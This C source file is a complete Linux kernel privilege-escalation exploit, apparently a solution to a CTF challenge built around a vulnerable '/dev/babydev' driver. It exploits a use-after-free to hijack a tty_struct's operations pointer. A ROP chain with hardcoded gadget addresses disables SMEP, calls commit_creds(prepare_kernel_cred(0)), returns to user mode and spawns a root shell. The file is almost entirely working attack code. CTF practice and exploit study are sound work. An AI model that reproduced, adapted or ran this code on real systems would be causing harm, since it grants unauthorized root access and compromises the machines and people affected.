#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef

size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main(void)
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();

    //get the addr
    FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd < 0)
    {
        printf("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n");
        exit(-1);
    }
    char buf[0x50], type[0x10];
    size_t addr;
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
    {
        if(prepare_kernel_cred && commit_creds)
            break;

        if(!commit_creds && !strcmp(buf, "commit_creds"))
        {
            commit_creds = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n", prepare_kernel_cred);
            continue;
        }
    }

    size_t rop[0x20], p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = getRootPrivilige;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    rop[p++] = getRootShell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;

    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    size_t fake_tty[0x20];
    int fd3 = open("/dev/ptmx", 2);
    read(fd2, fake_tty, 0x40);
    fake_tty[3] = fake_op;
    write(fd2, fake_tty, 0x40);

    write(fd3, buf, 0x8);

    return 0;
}
